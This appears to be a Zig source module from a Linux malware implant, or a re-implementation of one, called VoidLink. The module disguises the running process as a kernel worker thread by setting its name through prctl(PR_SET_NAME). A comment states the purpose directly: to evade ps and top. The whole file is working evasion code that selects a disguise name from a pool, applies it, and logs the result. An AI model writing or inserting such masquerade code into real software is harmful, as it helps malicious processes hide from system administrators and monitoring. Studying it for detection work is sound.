//! Process masquerade — mimic kernel worker threads.
//! VoidLink sets process name via prctl(PR_SET_NAME) to evade ps/top.
const std = @import("std");
const config = @import("config.zig");
const syscall = @import("syscall.zig");

/// Select a masquerade name deterministically from the pool.
pub fn selectName(seed: u64) []const u8 {
    const idx = seed % config.MASQUERADE_NAMES.len;
    return config.MASQUERADE_NAMES[idx];
}

/// Apply process name masquerade via prctl(PR_SET_NAME).
/// The name is truncated to 15 bytes + null (kernel limit).
pub fn applyMasquerade(name: []const u8) isize {
    var buf: [16]u8 = .{0} ** 16;
    const copy_len = @min(name.len, 15);
    @memcpy(buf[0..copy_len], name[0..copy_len]);
    buf[copy_len] = 0;
    return syscall.sys_prctl(config.PR_SET_NAME, @intFromPtr(&buf));
}

/// Apply masquerade and log result.
pub fn applyAndLog(name: []const u8) void {
    const rc = applyMasquerade(name);
    var extra_buf: [128]u8 = undefined;
    const extra = std.fmt.bufPrint(&extra_buf,
        \\"name":"{s}","result":{d}
    , .{ name, rc }) catch return;
    config.jsonLog("info", "masquerade", extra);
}
